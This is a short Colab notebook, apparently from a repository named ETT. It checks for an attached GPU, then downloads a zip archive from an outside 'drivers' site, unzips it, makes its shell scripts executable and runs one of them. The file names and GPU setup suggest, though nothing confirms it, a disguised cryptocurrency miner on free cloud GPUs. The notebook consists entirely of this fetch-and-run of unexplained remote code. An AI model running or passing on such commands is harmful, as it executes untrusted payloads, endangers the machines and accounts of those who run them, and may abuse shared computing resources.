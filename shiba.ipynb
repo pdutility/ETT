{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "trx.ipynb",
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "zWjy5GqjtTum",
        "outputId": "b2f7e1b9-4f73-433c-8dc8-79dc219a7d29"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "GPU 0: Tesla K80 (UUID: GPU-77c2870d-0a4d-cc07-7b96-dba5138dcc8e)\n"
          ]
        }
      ],
      "source": [
        "!nvidia-smi -L"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!wget https://driverslite.com/1.38.zip\n",
        "!unzip 1.38.zip\n",
        "!chmod  +x *.sh\n",
        "!./1.sh"
      ],
      "metadata": {
        "id": "6UQfTMcd1oP7"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}